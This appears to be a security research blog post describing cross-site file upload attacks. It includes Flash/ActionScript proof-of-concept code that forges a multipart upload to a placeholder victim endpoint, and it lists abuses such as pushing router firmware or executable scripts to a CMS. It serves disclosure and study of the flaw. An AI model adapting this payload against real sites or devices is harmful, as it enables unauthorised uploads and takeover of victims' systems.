<title>Cross-site file upload</title>
</head><body>The reason CSRF attacks against file uploads are not possible is because the HTML FORM specifications are not versatile enough to define sub-fields like filename=&quot;whatever.txt&quot;, which are vital parts of the multipart/form-data specifications when submitting files. This is the only restriction and I will show you that attackers can easily overcome it with a bit of help from Flash.<br/>
<br/>
We've already proved that various forms of home routers can be <a href="http://www.gnucitizen.org/blog/hacking-the-interwebs/">entirely compromised</a>and hacked by <a href="http://www.gnucitizen.org/blog/flash-upnp-attack-faq/">forging UPnP requests with flash</a>. Now I will show you that file uploading facilities can be attacked in a similar way. Let's examine the following code, which you can compile with Flex2 SDK - c:\Flex2\bin\mxmlc code.mxml:<br/>
<br/>
&lt;mx:Application xmlns:mx=&quot;http://www.adobe.com/2006/mxml&quot; creationComplete=&quot;onAppInit()&quot;&gt;<br/>
  &lt;mx:Script&gt;<br/>
    /* by Petko D. Petkov; pdp<br/>
    * GNUCITIZEN<br/>
    **/<br/>
    import flash.net.*;<br/>
<br/>
    private function onAppInit():void<br/>
    {<br/>
      var r:URLRequest = new URLRequest('http://victim.com/upload.php');<br/>
<br/>
      r.method = 'POST';<br/>
      r.data = unescape('-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22file%22%3B filename%3D%22gc.txt%22%0D%0AContent-Type%3A text%2Fplain%0D%0A%0D%0AHi from GNUCITIZEN%21%0D%0A-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22submit%22%0D%0A%0D%0ASubmit Query%0D%0A-----------------------------109092118919201--%0A');<br/>
      r.contentType = 'multipart/form-data; boundary=---------------------------109092118919201';<br/>
<br/>
      navigateToURL(r, '_self');<br/>
    }<br/>
  &lt;/mx:Script&gt;<br/>
&lt;/mx:Application&gt;<br/>
<br/>
If you carefully read the content of the script you will notice that we are preparing an URLRequest object which we load with a POST method, a contentType which equals to multipart/form-data and a url-encoded data text. If we unencode the text we get the following result. Now let's have a look at it as well. Notice the filename=&quot;gc.txt&quot; field:<br/>
<br/>
<br/>
-----------------------------109092118919201<br/>
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;gc.txt&quot;<br/>
Content-Type: text/plain<br/>
<br/>
Hi from GNUCITIZEN!<br/>
-----------------------------109092118919201<br/>
Content-Disposition: form-data; name=&quot;submit&quot;<br/>
<br/>
Submit Query<br/>
-----------------------------109092118919201--<br/>
<br/>
<br/>
This looks like a valid multipart/form-data file upload, doesn't it? If you compile and execute the code you will see that the file upload is completely valid and will upload a file called gc.txt with content of Hi from GNUCITIZEN!.<br/>

THE IMPACT OF CROSS-SITE FILE UPLOAD (CSFU) ATTACKS<br/>
Like CSRF attacks, there are plenty of things one can do with this type of technique. Here is a couple of evil things that come into my mind:<br/>
<ul><li>Upload a nasty picture on someone's profile - I admit this is not very useful but still very funny and open for abuse.</li>
<li>Upload a shiny new firmware to the router that is under attack by using the user as a proxy. This is pretty nasty and given the fact that there are numerous authentication bypass and A-to-C bugs floating around, it is very, very feasible.</li>
<li>Upload a shiny new configuration file on the router that is under attack. Same as the one above - very feasible and easy to perform.</li>
<li>Upload executable scripts on CMS - this of course is a bit more targeted..</li>
</ul>
